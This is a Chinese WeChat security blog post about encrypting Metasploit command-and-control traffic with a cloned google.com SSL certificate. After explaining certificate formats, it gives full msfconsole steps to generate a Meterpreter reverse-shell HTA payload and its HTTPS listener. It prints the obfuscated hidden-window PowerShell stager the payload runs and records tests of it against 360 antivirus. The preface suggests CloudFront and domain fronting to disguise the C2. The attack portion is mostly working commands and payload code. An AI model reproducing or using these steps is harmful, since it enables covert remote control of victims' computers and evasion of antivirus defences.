> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/R3S9FxZe-YLRRFn0mfeAkg)

点击蓝字关注我哦

  

  

  

  

**前言**
------

混淆是混淆不过人为分析的，只有加密才是 yyds，而 ssl 加密是最常用的加密手段，比如 c2 上个 ssl 证书，配合一个 aws

Amazon CloudFront 高度可信域名（也可以配合域前置，cloudflare 是个不错的选择，最好去 namesilo.com 注册域名，能免费保护隐私），然后就嗯嗯啊啊啊，你懂的

基础知识
----

.csr - 这是证书签名请求。某些应用程序可以生成这些文件以提交给证书颁发机构。实际格式为 PKCS10，它在 RFC 2986 中定义。它包括所请求证书的一些 / 全部密钥详细信息，例如主题，组织，状态，诸如此类，以及要签名的证书的公共密钥。这些由 CA 签名并返回证书。返回的证书是公用证书（包括公用密钥，但不包含专用密钥），其本身可以有两种格式。  

.pem - 在 RFC 1421 至 1424 中定义，这是一种容器格式，可以只包含公共证书（例如 Apache 安装和 CA 证书文件 / etc/ssl/certs），或者可以包括完整的证书链，包括公共密钥，私钥和根证书。令人困惑的是，由于 PKCS10 格式可以转换为 PEM ，因此它也可能对 CSR 进行编码。该名称来自 “隐私增强邮件（PEM）”，这是一种用于保护电子邮件的失败方法，但是其使用的容器格式仍然存在，并且是 x509 ASN.1 密钥的 base64 转换。

.key - 这是 PEM 格式的文件，仅包含特定证书的私钥，仅是常规名称，而不是标准化名称。在 Apache 安装中，该位置通常位于中 / etc/ssl/private。这些文件的权限非常重要，如果设置错误，某些程序将拒绝加载这些证书。

.pkcs12 .pfx .p12 - 最初由 RSA 在 “公钥密码标准”（缩写为 PKCS）中定义，“ 12” 变体最初由 Microsoft 增强，后来提交为 RFC 7292。这是包含公共和私有证书对的密码容器格式。与. pem 文件不同，此容器是完全加密的。Openssl 可以使用公钥和私钥将其转换为. pem 文件：openssl pkcs12 -in file-to-convert.p12 -out converted-file.pem -nodes。

这次用的的就是 pem 文件，包含了一个完整的证书链，简单方便使用。

  

使用
--

首先得拿到一个比较 nice 的 pem 文件，使用 kali 中的 Impersonate_SSL 模块，该模块通过选项中提供的经过身份验证的源的 SSL 证书创建本地副本，可以在提供 SSLCert 选项的 Metasploit 的所有模块中使用。

```
use auxiliary/gather/impersonate_ssl
msf6 auxiliary(gather/impersonate_ssl) > set rhost  www.google.com
rhost => www.google.com
msf6 auxiliary(gather/impersonate_ssl) > run
```

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtqkuTplNsf0PWREmv4NlgBibqvKOz7fRyVCaX9mHs3ZA5syaCXicHuZhAgC1ghrXVAhicMMKCw1cOJA/640?wx_fmt=png)

这里我使用了代理，然后就获得 google 证书副本

生成木马文件，好像 msfvenom 不提供证书选项，所以只能老老实实的用 msfconsole 了

```
msf6 > use windows/meterpreter/reverse_tcp
msf6 payload(windows/meterpreter/reverse_tcp) > set lhost 192.168.75.131
lhost => 192.168.75.131
msf6 payload(windows/meterpreter/reverse_tcp) > set lport 443
lport => 443
msf6 payload(windows/meterpreter/reverse_tcp) > set StagerVerifySSLCert true
StagerVerifySSLCert => true
msf6 payload(windows/meterpreter/reverse_tcp) > set handlersslcert /root/.msf4/loot/20210326024706_default_172.217.26.132_172.217.26.132_p_760535.pem
handlersslcert => /root/.msf4/loot/20210326024706_default_172.217.26.132_172.217.26.132_p_760535.pem
msf6 payload(windows/meterpreter/reverse_tcp) > generate -f hta-psh -o /root/patch.hta
```

设立监听：

```
msf6 exploit(multi/handler) > set paylod windows/meterpreter/reverse_https
paylod => windows/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 192.168.75.131
lhost => 192.168.75.131
msf6 exploit(multi/handler) > set lport 443
lport => 443
msf6 exploit(multi/handler) > set StageVerifySSLCert true
StageVerifySSLCert => true
msf6 exploit(multi/handler) > set hanlersslcert /root/.msf4/loot/20210326024706_default_172.217.26.132_172.217.26.132_p_760535.pem
hanlersslcert => /root/.msf4/loot/20210326024706_default_172.217.26.132_172.217.26.132_p_760535.pem
msf6 exploit(multi/handler) > run
```

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtqkuTplNsf0PWREmv4NlgBmXpr8DVicE2KscbrrAP2u6l5r3KQSVswwcCQVBuw8ic23UqKGBGWdPUQ/640?wx_fmt=png)

把生成 hta 文件拖到虚拟机，首先在没有 360 安全卫士和 360 杀毒的情况下进行测试。

```
rundll32.exe url.dll,OpenURL “patch.hta”
```

分析流量：从这里开始

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtqkuTplNsf0PWREmv4NlgB450kibzAyqa6PqKYRWGGSG6dXXsplw7EkdjgIE85avlzJ9ibYam75mGg/640?wx_fmt=png)

就开始用 ssl 加密流量了。

后续安装了 360 安全卫士，360 杀毒，静态无法查杀此 hta 马。

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtqkuTplNsf0PWREmv4NlgBTQBpKpkb18ibzjcTpakkdDuK2W9ibaJW1EQu0mjPfHpgAbhDGD1A2eaQ/640?wx_fmt=png)

但是执行行为过不了，因为剖析次 hta 马，也是通过 powershell 去执行命令

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtqkuTplNsf0PWREmv4NlgBUIf0dD0PqAHxF9fa1mIM4LmPGlJQGWRWhnUibaicTNmY0XHJkHiah0Jrg/640?wx_fmt=png)

把 powershell 要执行的 base64 字符串解码，发现，其继续内嵌 powershell

```
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAHWIXWACA7VWbW/iOBD+3Er9D9EKKYkuhfCi3W2llc6BBugSCoR3Fq3cxICLE9PEgXJ7+99vDEnbvbZ3uyddBMKxZ8Yzz/N4zCIJPUF5qPyxU76dnZ50cIQDRcvxO3NhKLmkXapz/eQEVnKL7Vj5pGgztNnUeIBpOL+8rCZRREJxfM/XiUBxTIJbRkms6cqfymhFInJ+c3tHPKF8U3Jf83XGbzFLzfZV7K2Ico5CX661uIdlMnl3w6jQ1C9fVH12Xpznr+4TzGJNdfexIEHeZ0zVle+63LC/3xBNdagX8ZgvRH5Ew3IpPwhjvCBtiLYlDhEr7seqDkXAJyIiiUJFliP9j6uaCsNOxD3k+xGJY9VQZjLybD7/XZul2/aSUNCA5JuhIBHfuCTaUo/E+QYOfUZ6ZDEHL1dENFzOdR3MtnxNtFyYMGYovxJGa5NdBtrPOmnPncCqIyLdACJflulwP2Hk6Ki+kueBex2eR/4Bue9np2eni0wsvLenz+UCo5PZYUwgPa3DY3qw+6SYhuLATljwaA+vuX6UEH3+CK6SI+vrsWW8HaCYWYMt70kFzoac+nPwSAnN+cVuT86/LcwaWdCQ1PYhDqiXaU97DWayYORQYz4za0NOmpouEL9GGFliIZGTbL9wuwqoePS1Esp8EiEPqIohK2BR/zGZIxma2gwdEgBGx3eQX24BiieZdaryfba7fAcjtcpwHBtKJ4Ej5xmKSzAjvqGgMKbpEkoEPwzVp3SdhAnq4Vhk4eZ6hmO6X5WHsYgSD2iD2vvuhngUMwmFoTSoT6y9S5fZvuqrQFQxY3ASINIWiIAZCYArpBgiSPFIvJ53iWgGG0YCMDocfpvhJRz1VPAH+eAl8dW/p5gp+ihfCUaGwrMEgWGXcWEoQxoJ6CESWFDRf9z+Wfc4JFKNSMqFlh2RmbUXUti5ze3t1zupyhSZAw6RAAzsiAcWjsn7yrFXaO8KN7SD4Jk0Q+b412tabO7g68B34Cx+a3l02REmDxyvGnfq9kdEd8ud97GNPP/aJxfusCLcq6aodlCjS02rsvIssw/jQVNMmk3RrKNGf+Uxs1NrFNxJbNJdYyRjHWN4lUpjbKJyuXJTNtcA3YQWl2vktwO6e2jBGJriTctqxpbZZFfX1d7tqGRPR6xRqNirxYjH7vtJrVAoXPi45uwRsrhfdvbjYo/3G15gVUJeuKhW1ugKoWp4NbQt/nliRahTGOLlhu8+r1rL0rKKUP0DJdPuwLa6XdtCg/rdfe2isCxcjMZ4ZY2GJTrdjHsreLd3ja5TMCtNnzzwj60RHW5lLOvesqdjjFrTvV0oFCdxCa8tjiwA1p7eo/pqsrE7DPz7gxJHQ9Z+su02ap+9afFD7Hx6J4kGpnP07v4ZfW/1XwdH8QozoBU6a3acbB7ZaavscCo9NA3u1zWJQsLgdoL7KxMkYox7slEfWipcEsfWLW+SAQzLpVdHuvJoqD918Gzq8nIKOYLGDxrMt0i4FCvDfCibJrRj86FiQo0/X1iVb/baMZYh+7lE5jE4OwTXpfRzu+1N+H9Clh63Ffz4/wbZ09w/rP4UjKZxKPjF7I8Tv4ToL9Y9wlSAnQu9gpHjffV6+ak4nt3pkhJgfpE+8i/ZTSLO23DVn53+Bc0wY038CQAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
```

然后在安装了 360 安全卫士，360 杀毒，继续执行

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtqkuTplNsf0PWREmv4NlgBIthUWvEIeyPeUXMicTtmT2qic6aKwJyXD8fumSW9NBUvSQyyibt6NYmIg/640?wx_fmt=png)

直接拦行为，就算我用 powershell 随便执行个 1 都会被拦，360 说用 powershell 就是高位行为，我不管，必须拦死

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtqkuTplNsf0PWREmv4NlgBEc0LbUOZxFaViaa2LjxJ0zQ1nJK0GOpGa2xZg5s54nUP5mib4vh8p64A/640?wx_fmt=png)

后面继续研究怎么绕，不知道参数污染可以不，但是参数污染好像也不行，这放个 1 都拦。不愧是 360 安全卫士

星球营造良好的技术交流氛围，一直秉承着有问有答才是真正的技术交流，如果你喜欢分享，喜欢学习，那么请加入我们吧  

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtqkuTplNsf0PWREmv4NlgBM0JCEP1HUInackWmZheMiaUr3yqYQsuvtqMurqdfpjzUSDcs5B7HicKA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtqkuTplNsf0PWREmv4NlgBicOicWibIolZyEuIjkxNwnTR2VgYKA7x1m68mLZl5yTiaHiaTP4tdSVQNtA/640?wx_fmt=png)

老哥们纷纷放出大招，牛逼 class  

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtqkuTplNsf0PWREmv4NlgB4ECxHxujzTfAZwprckQC6iavj9Mccn0GmYYeoPJOrzXGIX4vSVKsKmQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtqkuTplNsf0PWREmv4NlgBVku9M3wmC5WDG4HMHIicFGiaTtzMhZjBheDialRNYAOcog7n4GkI6qibpg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtqkuTplNsf0PWREmv4NlgBiaLt0fe5PzasNs5GibsgwVQMqK35hnEE2XV5vWajpDyuBzOUsNeGib9BA/640?wx_fmt=png)

欢迎加入我们，学习技术，分享技术，解决难题  

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtqkuTplNsf0PWREmv4NlgBjzsNibIy0mNtQ94iaBldm2ZwgZJBfiauCmoye0hXYndakYayehPcvaAhw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODsGoxEE3kouByPbyxDTzYIgX0gMz5ic70ZMzTSNL2TudeJpEAtmtAdGg9J53w4RUKGc34zEyiboMGWw/640?wx_fmt=png)

END

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODsGoxEE3kouByPbyxDTzYIgX0gMz5ic70ZMzTSNL2TudeJpEAtmtAdGg9J53w4RUKGc34zEyiboMGWw/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtIZ5VYusLbEoY8iaTjibTWg6AKjAQiahf2fctN4PSdYm2O1Hibr56ia39iaJcxBoe04t4nlYyOmRvCr56Q/640?wx_fmt=gif)

**看完记得点赞，关注哟，爱您！**

**请严格遵守网络安全法相关条例！此分享主要用于学习，切勿走上违法犯罪的不归路，一切后果自付！**

  

关注此公众号，回复 "Gamma" 关键字免费领取一套网络安全视频以及相关书籍，公众号内还有收集的常用工具！

  

**在看你就赞赞我！**

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbThXaInFkmyjOOcBoNCXGun5icNbT4mjCjcREA3nMN7G8icS0IKM3ebuLA/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTkwLkofibxKKjhEu7Rx8u1P8sibicPkzKmkjjvddDg8vDYxLibe143CwHAw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/96Koibz2dODuKK75wg0AnoibFiaUSRyYlmhIZ0mrzg9WCcWOtyblENWAOdHxx9BWjlJclPlVRxA1gHkkxRpyK2cpg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTicALFtE3HLbUiamP3IAdeINR1a84qnmro82ZKh4lpl5cHumDfzCE3P8w/640?wx_fmt=gif)

扫码关注我们

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTicALFtE3HLbUiamP3IAdeINR1a84qnmro82ZKh4lpl5cHumDfzCE3P8w/640?wx_fmt=gif)

扫码领 hacker 资料，常用工具，以及各种福利

![](https://mmbiz.qpic.cn/mmbiz_gif/96Koibz2dODtaCxgwMT2m4uYpJ3ibeMgbTnHS31hY5p9FJS6gMfNZcSH2TibPUmiam6ajGW3l43pb0ySLc1FibHmicibw/640?wx_fmt=gif)

转载是一种动力 分享是一种美德